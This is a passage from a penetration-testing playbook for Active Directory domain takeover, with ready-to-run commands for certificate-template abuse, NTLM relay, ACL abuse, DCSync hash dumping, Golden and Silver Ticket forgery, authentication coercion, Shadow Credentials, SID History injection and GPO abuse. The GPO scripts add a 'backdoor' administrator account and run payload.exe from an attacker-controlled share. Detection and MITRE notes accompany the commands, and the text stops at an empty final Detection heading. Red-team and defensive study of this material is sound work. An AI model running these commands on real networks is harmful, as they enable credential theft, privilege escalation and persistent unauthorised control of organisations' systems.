**ESC2: Any Purpose EKU or No EKU (SubCA-equivalent)**
```bash
# Template has Any Purpose or SubCA EKU — can be used for any purpose
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "AnyPurposeTemplate" \
  -upn administrator@$DOMAIN \
  -dc-ip $TARGET_DC
```

**ESC3: Enrollment Agent Templates (Certificate Request Agent)**
```bash
# Step 1: Request Enrollment Agent certificate
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "EnrollmentAgentTemplate" \
  -out $LOOT_DIR/agent.pfx \
  -dc-ip $TARGET_DC

# Step 2: Use enrollment agent cert to request on behalf of admin
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "UserTemplate" \
  -on-behalf-of "$DOMAIN_SHORT\\administrator" \
  -pfx $LOOT_DIR/agent.pfx \
  -out $LOOT_DIR/admin_esc3.pfx \
  -dc-ip $TARGET_DC

certipy auth -pfx $LOOT_DIR/admin_esc3.pfx -dc-ip $TARGET_DC
```

**ESC4: Write ACL on Certificate Template**
```bash
# If we have WriteProperty/GenericWrite/GenericAll on a template,
# modify it to become ESC1-vulnerable

# Step 1: Modify template to add SAN flag
certipy template \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -template "TargetTemplate" \
  -save-old \       # Save original config for restoration
  -dc-ip $TARGET_DC

# Step 2: Now request with modified template (ESC1 path)
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "TargetTemplate" \
  -upn administrator@$DOMAIN \
  -dc-ip $TARGET_DC
```

**ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag**
```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
# Any template that allows client auth can have SAN specified

certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "User" \      # Even the default User template works
  -upn administrator@$DOMAIN \
  -dc-ip $TARGET_DC
```

**ESC7: CA Officer/Manager Abuse**
```bash
# If we have ManageCA or ManageCertificates rights on CA:

# Step 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
certipy ca \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -enable-template "SubCA" \    # Enable SubCA template
  -dc-ip $TARGET_DC

# Step 2: Request SubCA certificate, get it approved
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -template "SubCA" \
  -upn administrator@$DOMAIN \
  -dc-ip $TARGET_DC

# Step 3: Issue the failed certificate (as CA Manager)
certipy ca \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -issue-request $REQUEST_ID \
  -dc-ip $TARGET_DC

# Step 4: Retrieve the issued cert
certipy req \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -ca "$CA_NAME" \
  -retrieve $REQUEST_ID \
  -out $LOOT_DIR/admin_esc7.pfx \
  -dc-ip $TARGET_DC
```

**ESC8: NTLM Relay to ADCS Web Enrollment**
```bash
# CA has Web Enrollment enabled without EPA (Extended Protection for Auth)

# Step 1: Turn off Responder's HTTP/SMB (use ntlmrelayx for relay)
# Edit Responder.conf: HTTP = Off, SMB = Off
responder -I eth0 -wrf --no-http-server --no-smb-server

# Step 2: Start relay targeting ADCS enrollment URL
ntlmrelayx.py \
  -t http://$CA_HOST/certsrv/certfnsh.asp \
  --adcs \
  --template "DomainController" \   # Or Machine, User
  -smb2support

# Step 3: Coerce DC authentication to trigger relay
python3 PetitPotam.py \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  $ATTACKER_IP $TARGET_DC

# ntlmrelayx relays DC's auth to ADCS, gets cert for DC machine account
# Output: base64 certificate saved automatically

# Step 4: Authenticate with DC certificate (get DC TGT + hash)
certipy auth \
  -pfx $LOOT_DIR/dc.pfx \
  -username DC01$ \
  -domain $DOMAIN \
  -dc-ip $TARGET_DC

# Now DCSync as DC machine account
export KRB5CCNAME=$LOOT_DIR/DC01\$.ccache
secretsdump.py $DOMAIN/DC01\$@$TARGET_DC -k -no-pass
```

### Detection
- Event ID 4886: Certificate request received (CA log - high volume unusual)
- Event ID 4887: Certificate issued — especially for admin accounts or DC machine accounts
- Certificate template audit: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x1) in msPKI-Certificate-Name-Flag
- Alert: SAN in issued certificate differs from subject (ESC1 indicator)
- AD CS audit logs: CA Manager actions (ESC7)
- ESC8: IIS logs on CA web enrollment showing NTLM auth from machine accounts

### MITRE ATT&CK
- T1649 - Steal or Forge Authentication Certificates
- T1557 - Adversary-in-the-Middle (ESC8)

---

## Technique 10: ACL Abuse

### Objective
Exploit misconfigured Access Control Entries (ACEs) on AD objects to escalate privileges — changing passwords, adding users to privileged groups, granting DCSync rights, or modifying object properties — without exploiting any vulnerability in the traditional sense.

### Prerequisites
- Valid domain credentials with at least one abusable ACE in BloodHound paths
- BloodHound analysis completed (to identify paths)
- Impacket, PowerView, or bloodyAD

### Tools
- `bloodyAD` (Linux, comprehensive ACL abuse)
- `PowerView` (Windows)
- `net` commands (Windows, simple group ops)
- `dacledit.py` (Impacket)

### Procedure

**Step 1: Identify ACL attack paths in BloodHound**
```
In BloodHound UI:
- "Find Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- Right-click target -> "Shortest Paths From Here"
- Filter: GenericAll, GenericWrite, WriteOwner, WriteDACL, ForceChangePassword

Key edges to look for:
  GenericAll     -> Full control (password change, add to group, etc.)
  GenericWrite   -> Modify attributes (add SPN, etc.)
  WriteOwner     -> Take object ownership, then WriteDACL
  WriteDACL      -> Grant yourself GenericAll
  ForceChangePassword -> Change password without knowing current
  AddMember      -> Add users to groups
  AllExtendedRights -> Includes ForceChangePassword, DCSync
```

**ACE: ForceChangePassword - Reset target account password**
```bash
# bloodyAD (Linux)
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  set password $TARGET_USER "NewPassword@2025!"

# PowerView (Windows)
$SecurePassword = ConvertTo-SecureString "NewPassword@2025!" -AsPlainText -Force
Set-DomainUserPassword -Identity $TARGET_USER -AccountPassword $SecurePassword
```

**ACE: GenericAll on User - Multiple abuse paths**
```bash
# Path 1: Change password
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  set password $TARGET_USER "NewPassword@2025!"

# Path 2: Targeted Kerberoasting (add SPN to user)
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  set object $TARGET_USER servicePrincipalName \
  -v "http/attacker.$DOMAIN"

# Now Kerberoast that account
GetUserSPNs.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -request-user $TARGET_USER

# Path 3: Shadow Credentials (see Technique 15)
```

**ACE: GenericAll on Group - Add user to group**
```bash
# Add current user to Domain Admins (or target group)
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  add groupMember "Domain Admins" $USERNAME

# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members $USERNAME
```

**ACE: WriteDACL - Grant DCSync rights**
```bash
# Grant current user DCSync rights on domain object
dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action write \
  -rights DCSync \
  -principal $USERNAME \
  -target-dn "DC=${DOMAIN//./,DC=}"

# Verify
dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action read \
  -principal $USERNAME

# Now run DCSync
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc
```

**ACE: WriteOwner - Take ownership then modify**
```bash
# Step 1: Take ownership of object
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  set owner $TARGET_USER $USERNAME

# Step 2: Write DACL to grant ourselves GenericAll
dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action write \
  -rights FullControl \
  -principal $USERNAME \
  -target-dn "CN=$TARGET_USER,CN=Users,DC=${DOMAIN//./,DC=}"

# Step 3: Now use GenericAll path above
```

**ACE: AllExtendedRights on Domain - DCSync**
```bash
# Directly run DCSync if AllExtendedRights granted on domain
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc \
  -outputfile $LOOT_DIR/dcsync_output
```

### Detection
- Event ID 4662: Operation on AD object — especially write operations from non-admin accounts
- Event ID 4728: Member added to security-enabled global group
- Event ID 4756: Member added to security-enabled universal group
- Event ID 4738: User account changed (password reset, SPN addition)
- Event ID 5136: Directory service object modified (critical — enable DS Access auditing)
- Alert: ACL change on Domain object (DCSync rights grant)

### MITRE ATT&CK
- T1222 - File and Directory Permissions Modification
- T1098 - Account Manipulation
- T1003.006 - DCSync (when DCSync rights are granted)

---

## Technique 11: DCSync

### Objective
Impersonate a Domain Controller's replication process to request password hashes for any account (including KRBTGT and Administrator) directly from a DC, without touching LSASS. Requires Replicating Directory Changes and Replicating Directory Changes All rights on the domain object.

### Prerequisites
- Account with DCSync rights: Domain Admins, Enterprise Admins, Domain Controllers group, or explicit Replicating Directory Changes rights
- Network access to DC on LDAP (389) and DRSUAPI
- Impacket or Mimikatz

### Tools
- `secretsdump.py` (Impacket - Linux)
- `mimikatz` (Windows: `lsadump::dcsync`)

### Procedure

**Step 1: Verify DCSync rights**
```bash
# Check if current account has replication rights
dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action read \
  -principal $USERNAME

# Look for: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All
```

**Step 2: DCSync - Single account (targeted, low noise)**
```bash
# Dump only KRBTGT (minimum required for Golden Ticket)
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc-user krbtgt

# Dump specific accounts
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc-user administrator

secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc-user "$DOMAIN_SHORT\\$TARGET_USER"
```

**Step 3: DCSync - Full domain dump**
```bash
# All users with hashes - saves to files automatically
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc \
  -outputfile $LOOT_DIR/domain_hashes

# Output files:
# $LOOT_DIR/domain_hashes.ntds       - NT hashes
# $LOOT_DIR/domain_hashes.ntds.kerberos - Kerberos keys
# $LOOT_DIR/domain_hashes.ntds.cleartext - Cleartext (reversible encryption)
```

**Step 4: DCSync with NTLM hash auth (PTH)**
```bash
secretsdump.py \
  -hashes :$HASH \
  $DOMAIN/$USERNAME@$TARGET_DC \
  -just-dc-user krbtgt
```

**Step 5: DCSync with Kerberos ticket**
```bash
export KRB5CCNAME=$LOOT_DIR/admin.ccache
secretsdump.py \
  -k -no-pass \
  $DOMAIN/$USERNAME@$TARGET_DC \
  -just-dc-user krbtgt
```

**Step 6: From Windows with Mimikatz**
```powershell
# In elevated Mimikatz session
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /user:administrator
lsadump::dcsync /domain:$DOMAIN /all /csv
```

### Detection
- Event ID 4662: Operation on object with DS-Replication-Get-Changes GUID from non-DC source
- Network: DRSUAPI RPC calls from non-DC IP to DC on port 135/dynamic RPC
- Microsoft Defender for Identity: "DCSync attack (replication of directory services)" alert
- Honey user: Create a user that is never legitimately synced; any DCSync request for it is malicious
- SIEM rule: `EventID=4662 AND ObjectType="domain" AND Properties="{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}" AND SubjectUserName NOT IN dc_accounts`

### MITRE ATT&CK
- T1003.006 - OS Credential Dumping: DCSync

---

## Technique 12: Golden Ticket

### Objective
Forge a Kerberos TGT for any account using the KRBTGT account hash, bypassing the KDC entirely. Golden Tickets remain valid even after password resets and provide persistent Domain Admin access.

### Prerequisites
- KRBTGT NT hash (from DCSync or NTDS.dit extraction)
- Domain SID
- Target username to impersonate
- Impacket ticketer or Mimikatz

### Tools
- `ticketer.py` (Impacket)
- `mimikatz` (Windows)
- `getPac.py` (to get Domain SID if needed)

### Procedure

**Step 1: Gather required information**
```bash
# Get Domain SID if not already known
lookupsid.py $DOMAIN/$USERNAME:"$PASSWORD"@$TARGET_DC | grep "Domain SID"

# Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
# Store as: DOMAIN_SID=S-1-5-21-...

# Get KRBTGT hash via DCSync
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc-user krbtgt \
  | grep "krbtgt:502:"
# Format: krbtgt:502:LMHASH:NTHASH:::
# KRBTGT_HASH = the NT hash portion
```

**Step 2: Forge Golden Ticket**
```bash
# Create Golden Ticket for Administrator (10-year validity by default)
ticketer.py \
  -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  -groups 512,513,518,519,520 \   # RID 512=DA, 518=EA, 519=SA
  administrator

# Output: administrator.ccache in current directory
```

**Step 3: Use the Golden Ticket**
```bash
export KRB5CCNAME=$LOOT_DIR/administrator.ccache

# Verify ticket
klist

# Access DC
psexec.py $DOMAIN/administrator@$TARGET_DC -k -no-pass
wmiexec.py $DOMAIN/administrator@$TARGET_DC -k -no-pass

# Access any host in the domain
psexec.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass

# Dump secrets from DC
secretsdump.py $DOMAIN/administrator@$TARGET_DC -k -no-pass
```

**Step 4: Golden Ticket with custom RIDs and groups**
```bash
# Include extra privileged groups
ticketer.py \
  -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  -groups 512,513,518,519,520 \
  -user-id 500 \           # Administrator RID
  -extra-sid $DOMAIN_SID-519 \  # Enterprise Admins
  administrator
```

**Step 5: From Windows with Mimikatz**
```powershell
kerberos::golden /user:administrator /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$KRBTGT_HASH /ptt
# /ptt = pass-the-ticket (inject directly into current session)
misc::cmd   # Open cmd.exe with DA privileges
```

### Detection
- Event ID 4769: Service ticket requested with unusual encryption (RC4 when AES enforced)
- Golden Ticket indicator: TGT with 10-year or very long validity lifetime
- Event ID 4624 Logon Type 3 with account that doesn't match any known active session
- Microsoft Defender for Identity: "Forged PAC (MS14-068)" and "Golden ticket usage" alerts
- Mitigation: Rotate KRBTGT password TWICE (invalidates all golden tickets) + enforce AES

### MITRE ATT&CK
- T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket

---

## Technique 13: Silver Ticket

### Objective
Forge a Kerberos TGS for a specific service using the service account's NT hash, enabling access to a targeted service without contacting the KDC. Stealthier than Golden Tickets as it does not require KRBTGT hash and generates no KDC traffic.

### Prerequisites
- NT hash of the service account (from DCSync, credential dump, or cracking)
- Domain SID
- Target SPN of the service to access

### Tools
- `ticketer.py` (Impacket)
- `mimikatz` (Windows)

### Procedure

**Step 1: Identify target service and service account hash**
```bash
# Common Silver Ticket targets:
# cifs/$TARGET_HOST.$DOMAIN     (SMB/file access) - uses machine account hash
# host/$TARGET_HOST.$DOMAIN     (WMI, PSRemoting) - machine account hash
# http/$TARGET_HOST.$DOMAIN     (IIS, SharePoint) - app pool account hash
# MSSQLSvc/$TARGET_HOST:1433    (SQL Server) - service account hash
# WSMAN/$TARGET_HOST.$DOMAIN    (WinRM) - machine account hash

# Get machine account hash via DCSync
secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -just-dc-user "$TARGET_HOST\$"
```

**Step 2: Forge Silver Ticket**
```bash
# CIFS Silver Ticket (file share access)
ticketer.py \
  -nthash $SERVICE_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  -spn cifs/$TARGET_HOST.$DOMAIN \
  administrator

# HOST Silver Ticket (WMI/PSRemoting)
ticketer.py \
  -nthash $SERVICE_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  -spn host/$TARGET_HOST.$DOMAIN \
  administrator

# MSSQLSvc Silver Ticket
ticketer.py \
  -nthash $SERVICE_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  -spn MSSQLSvc/$TARGET_HOST.$DOMAIN:1433 \
  administrator
```

**Step 3: Use the Silver Ticket**
```bash
export KRB5CCNAME=$LOOT_DIR/administrator.ccache

# SMB access with CIFS ticket
smbclient.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass
smbexec.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass

# WMI exec with HOST ticket
wmiexec.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass

# SQL Server with MSSQLSvc ticket
mssqlclient.py $DOMAIN/administrator@$TARGET_HOST -k -no-pass -windows-auth
```

**Step 4: From Windows with Mimikatz**
```powershell
kerberos::golden /user:administrator /domain:$DOMAIN /sid:$DOMAIN_SID \
  /target:$TARGET_HOST.$DOMAIN /service:cifs /rc4:$SERVICE_HASH /ptt
misc::cmd
dir \\$TARGET_HOST\C$
```

### Detection
- Silver tickets do NOT appear in Event ID 4769 on DC (no KDC contact)
- Event ID 4624/4634 on target host: Logon/Logoff for the forged account
- Silver ticket indicator: Service tickets with unusual PAC signatures or missing fields
- Microsoft Defender for Identity: "Silver ticket usage" alert (behavioral detection)
- Mitigation: AES-only enforcement, Privileged Access Workstations, SPN review

### MITRE ATT&CK
- T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket

---

## Technique 14: Authentication Coercion (DFSCoerce / PetitPotam)

### Objective
Force a Domain Controller or high-value Windows host to authenticate to an attacker-controlled machine using various RPC-based coercion techniques. The forced authentication is then relayed to LDAP, ADCS, or other services.

### Prerequisites
- Valid domain credentials (for most coercion methods)
- Target host has relevant service running (Spooler, EFSRPC, DFS)
- Relay target available (ADCS web enrollment, LDAP without signing)

### Tools
- `PetitPotam.py` (EFSRPC coercion)
- `DFSCoerce.py` (DFSN coercion - bypasses PetitPotam patches)
- `printerbug.py` / `SpoolSample` (MS-RPRN spooler coercion)
- `ntlmrelayx.py` (for relay chains)
- `coercer` (multi-method coercion scanner/executor)

### Procedure

**Step 1: Check what coercion vectors are available**
```bash
# Coercer scans for all available coercion methods
coercer scan \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  --target-ip $TARGET_DC \
  --listener-ip $ATTACKER_IP

# Check Spooler service
crackmapexec smb $TARGET_DC \
  -u $USERNAME -p "$PASSWORD" \
  -M spooler

# Check WebDAV (for HTTP coercion)
crackmapexec smb $TARGET_DC \
  -u $USERNAME -p "$PASSWORD" \
  -M webdav
```

**Step 2: Set up relay before coercing**
```bash
# For ADCS ESC8 relay (most impactful)
ntlmrelayx.py \
  -t http://$CA_HOST/certsrv/certfnsh.asp \
  --adcs \
  --template "DomainController" \
  -smb2support &

# For LDAP relay (ACL abuse)
ntlmrelayx.py \
  -t ldap://$TARGET_DC \
  --escalate-user $USERNAME \
  -smb2support &
```

**Step 3: PetitPotam coercion (EFSRPC)**
```bash
# Unauthenticated (pre-patch targets)
python3 PetitPotam.py $ATTACKER_IP $TARGET_DC

# Authenticated (post-patch, still works with creds)
python3 PetitPotam.py \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  $ATTACKER_IP $TARGET_DC
```

**Step 4: DFSCoerce (bypasses PetitPotam patches)**
```bash
# Requires valid domain credentials
python3 dfscoerce.py \
  -u $USERNAME -d $DOMAIN -p "$PASSWORD" \
  $ATTACKER_IP $TARGET_DC

# Against non-DC target
python3 dfscoerce.py \
  -u $USERNAME -d $DOMAIN -p "$PASSWORD" \
  $ATTACKER_IP $TARGET_HOST
```

**Step 5: PrinterBug / SpoolSample**
```bash
# Check if spooler service is running
impacket-rpcdump $TARGET_DC | grep -i "spoolsv\|print"

# Coerce using MS-RPRN
python3 printerbug.py \
  $DOMAIN/$USERNAME:"$PASSWORD" \
  $TARGET_DC $ATTACKER_IP
```

**Step 6: Coercer (all methods)**
```bash
# Coerce with all available methods
coercer coerce \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  --target-ip $TARGET_DC \
  --listener-ip $ATTACKER_IP \
  --always-continue   # Try all methods even after success
```

### Detection
- DFSN-Server Event ID 515: DFS root (DFSCoerce specific)
- Event ID 4624: Machine account logon from unexpected source
- Network: NTLM authentication attempts from DC to non-DC host
- RPC audit: EFS (MS-EFSRPC) calls to DCs from non-server hosts
- Microsoft Defender for Identity: "Suspicious use of PetitPotam to force authentication"
- Mitigation: Disable Print Spooler on DCs, block EFS on DCs, enable LDAP Signing + EPA

### MITRE ATT&CK
- T1187 - Forced Authentication
- T1557 - Adversary-in-the-Middle

---

## Technique 15: Shadow Credentials

### Objective
Abuse write access to the `msDS-KeyCredentialLink` attribute to add a certificate-based credential to a target account, then authenticate as that account using the certificate to retrieve a TGT and NT hash — without knowing the account's password.

### Prerequisites
- Write access to `msDS-KeyCredentialLink` on target object (via GenericWrite, GenericAll, or targeted ACE)
- ADCS or KDC support for PKINIT (standard in modern AD environments)
- Impacket + certipy or pywhisker

### Tools
- `pywhisker` (Python, full shadow credential workflow)
- `certipy shadow` (alternative)
- `getST.py` / `certipy auth` (use the credential)

### Procedure

**Step 1: Verify write access to msDS-KeyCredentialLink**
```bash
# BloodHound: Look for "GenericWrite" edge to target user/computer
# Or check directly:
dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action read \
  -target-dn "CN=$TARGET_USER,CN=Users,DC=${DOMAIN//./,DC=}"
```

**Step 2: Add shadow credential using pywhisker**
```bash
# Add a new key credential (generates cert+key pair)
python3 pywhisker.py \
  -d $DOMAIN \
  -u $USERNAME \
  -p "$PASSWORD" \
  --target $TARGET_USER \
  --action add \
  --dc-ip $TARGET_DC \
  --filename $LOOT_DIR/shadow_$TARGET_USER

# Output: generates $LOOT_DIR/shadow_$TARGET_USER.pfx + password
```

**Step 3: Verify shadow credential was added**
```bash
python3 pywhisker.py \
  -d $DOMAIN \
  -u $USERNAME \
  -p "$PASSWORD" \
  --target $TARGET_USER \
  --action list \
  --dc-ip $TARGET_DC
```

**Step 4: Authenticate with shadow credential**
```bash
# Using certipy auth with the pfx
certipy auth \
  -pfx $LOOT_DIR/shadow_$TARGET_USER.pfx \
  -username $TARGET_USER \
  -domain $DOMAIN \
  -dc-ip $TARGET_DC

# Output: NT hash + TGT ccache file
```

**Step 5: Use recovered NT hash**
```bash
# Pass the hash to access resources
crackmapexec smb $TARGET_DC \
  -u $TARGET_USER \
  -H $RECOVERED_HASH \
  -d $DOMAIN

# Or use the TGT
export KRB5CCNAME=$LOOT_DIR/$TARGET_USER.ccache
psexec.py $DOMAIN/$TARGET_USER@$TARGET_HOST -k -no-pass
```

**Step 6: Using certipy shadow (alternative)**
```bash
# certipy shadow auto (add + authenticate in one command)
certipy shadow auto \
  -u $USERNAME@$DOMAIN \
  -p "$PASSWORD" \
  -account $TARGET_USER \
  -dc-ip $TARGET_DC
```

**Step 7: Cleanup - Remove shadow credential**
```bash
python3 pywhisker.py \
  -d $DOMAIN \
  -u $USERNAME \
  -p "$PASSWORD" \
  --target $TARGET_USER \
  --action remove \
  --device-id $DEVICE_ID \   # From the list command output
  --dc-ip $TARGET_DC
```

### Detection
- Event ID 5136: Directory service object modified — specifically `msDS-KeyCredentialLink` attribute write
- Alert: `msDS-KeyCredentialLink` modification on any non-WHfB enrolled device (Windows Hello for Business writes this legitimately)
- Event ID 4768: AS-REQ with PKINIT from unexpected host
- Baseline: Track all `msDS-KeyCredentialLink` values per object; new values are suspicious

### MITRE ATT&CK
- T1556 - Modify Authentication Process
- T1649 - Steal or Forge Authentication Certificates

---

## Technique 16: SID History Injection

### Objective
Add a privileged SID (e.g., Domain Admins SID) to a compromised account's `sIDHistory` attribute, granting that account the privileges of the injected SID without visibly being a member of the privileged group.

### Prerequisites
- Domain Admin or DCSync capability (sIDHistory write requires replication-level access)
- Target account to inject into
- Domain SID

### Tools
- `mimikatz` (Windows: `sid::patch`, `misc::AddSid`)
- `secretsdump.py` + NTDS manipulation (complex)
- `bloodyAD` (if WriteSIDHistory ACE exists)

### Procedure

**Step 1: Enable SID History via Mimikatz (requires DA)**
```powershell
# From Windows as Domain Admin
# Step 1: Enable WMI-based sid::patch (circumvents LSA protection)
privilege::debug
sid::patch

# Add Domain Admins SID to target account's SID history
misc::AddSid /sam:$TARGET_USER /new:$DOMAIN_SID-512
# 512 = Domain Admins RID
```

**Step 2: Add SID History via LDAP (if WriteSIDHistory ACE)**
```bash
# Using bloodyAD if WriteSIDHistory permission exists
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  set object $TARGET_USER sIDHistory \
  -v "$DOMAIN_SID-512"
```

**Step 3: Add foreign domain SID for cross-trust persistence**
```bash
# Get Enterprise Admins SID from root domain
lookupsid.py $DOMAIN/$USERNAME:"$PASSWORD"@$ROOT_DC | grep "Enterprise Admins"
# Enterprise Admins SID: S-1-5-21-ROOTDOMAIN-519

# Add to account in child domain
# Grants Enterprise Admin in root domain from child domain account
misc::AddSid /sam:$TARGET_USER /new:S-1-5-21-ROOTDOMAIN-519
```

**Step 4: Verify SID History**
```bash
# From Linux
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(cn=$TARGET_USER)" \
  sIDHistory

# From Windows
Get-ADUser -Identity $TARGET_USER -Properties SIDHistory | \
  Select-Object -ExpandProperty SIDHistory
```

**Step 5: Use account with injected SID History**
```bash
# Just authenticate normally — Windows honors SID History in PAC
crackmapexec smb $TARGET_DC -u $TARGET_USER -p "$PASSWORD" -d $DOMAIN
# Should show as DA-equivalent access
```

### Detection
- Event ID 4765: SID History was added to an account
- Event ID 4766: An attempt to add SID History to an account failed
- Alert: Any SID History modification outside of domain migration projects
- BloodHound query: Accounts with SID History containing high-privilege SIDs
- SIEM: `EventID=4765` should be extremely rare in production; alert on every occurrence

### MITRE ATT&CK
- T1134.005 - Access Token Manipulation: SID-History Injection

---

## Technique 17: GPO Abuse

### Objective
Abuse write access to Group Policy Objects to execute code on all computers or users within the GPO's scope, or to modify security settings (disable Windows Defender, add local admins, etc.) across multiple systems simultaneously.

### Prerequisites
- Write access to a GPO (via GenericAll, GenericWrite, CreateChild on SYSVOL, GpLink on OU)
- The compromised account's scope includes the target systems
- Either Windows access or remote SYSVOL write capability

### Tools
- `SharpGPOAbuse.exe` (Windows - comprehensive GPO modification)
- `PowerView` (GPO enumeration + targeted modification)
- `pygpoabuse` (Python, Linux-capable)

### Procedure

**Step 1: Enumerate GPO permissions**
```bash
# PowerView: Find GPOs we can write
Get-DomainGPO | ForEach-Object {
  $GpoPath = $_.gpcfilesyspath
  $GpoName = $_.displayname
  $GpoPerm = Get-ObjectAcl -ResolveGUIDs -LDAPFilter "(cn=$(($_.distinguishedname)))" |
    Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll|GenericWrite|CreateChild|Self" }
  if ($GpoPerm) { Write-Host "$GpoName - $($GpoPerm.IdentityReference)" }
}

# BloodHound: "GPO Admin Rights" edges, "GenericWrite" on GPO objects
```

**Step 2: Find what the target GPO applies to**
```bash
# Which OUs does this GPO link to?
Get-DomainGPOLocalGroup -GPOIdentity $GPO_GUID | Select-Object \
  GPODisplayName, ContainerName, ObjectDistinguishedName

# Find computers in affected OUs
Get-DomainOU -GPLink $GPO_GUID | Get-DomainComputer | Select-Object Name
```

**Step 3: Add local admin via GPO (SharpGPOAbuse)**
```powershell
# Add domain user as local admin on all GPO-scoped computers
.\SharpGPOAbuse.exe \
  --AddLocalAdmin \
  --UserAccount $USERNAME \
  --GPOName "Target GPO Name"

# Add computer startup script
.\SharpGPOAbuse.exe \
  --AddComputerScript \
  --ScriptName "update.bat" \
  --ScriptContents "net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add" \
  --GPOName "Target GPO Name"

# Add user logon script
.\SharpGPOAbuse.exe \
  --AddUserScript \
  --ScriptName "logon.bat" \
  --ScriptContents "cmd /c \\\\$ATTACKER_IP\share\payload.exe" \
  --GPOName "Target GPO Name"

# Schedule immediate task (fastest execution)
.\SharpGPOAbuse.exe \
  --AddComputerTask \
  --TaskName "Update" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c \\\\$ATTACKER_IP\share\payload.exe" \
  --GPOName "Target GPO Name"
```

**Step 4: GPO abuse from Linux (pygpoabuse)**
```bash
# Add local admin via GPO from Linux
python3 pygpoabuse.py \
  $DOMAIN/$USERNAME:"$PASSWORD" \
  -gpo-id $GPO_GUID \
  -task-name "Update" \
  -command "cmd /c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add" \
  -description "Windows Update" \
  -dc-ip $TARGET_DC \
  -f   # Force even if GPO seems unmodified
```

**Step 5: Force GPO update on target**
```bash
# Force immediate update (if you have WMI/PSRemoting to target)
crackmapexec smb $TARGET_HOST \
  -u $USERNAME -p "$PASSWORD" -d $DOMAIN \
  -x "gpupdate /force"

# WMI
wmiexec.py $DOMAIN/$USERNAME:"$PASSWORD"@$TARGET_HOST \
  "gpupdate /force"
```

### Detection
